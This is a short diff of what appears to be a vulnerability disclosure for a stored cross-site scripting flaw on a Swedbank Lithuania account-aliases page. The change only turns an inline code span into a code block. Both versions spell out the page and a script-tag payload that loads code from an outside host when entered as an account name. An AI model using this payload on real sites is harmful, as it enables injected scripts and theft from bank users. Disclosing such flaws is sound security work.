@@ -16,7 +16,9 @@ https://www.swedbank.lt/private/home/important/aliases
 (pageId = private.home.important.aliases)
 
 Then change any account name to this payload:
-`A<script src=“//p0wn.eu”></script>`
+```
+A<script src=“//p0wn.eu”></script>
+```
 And save the user input form.
 
 *Note* To make an isolated check from external network a simple hint can be used:
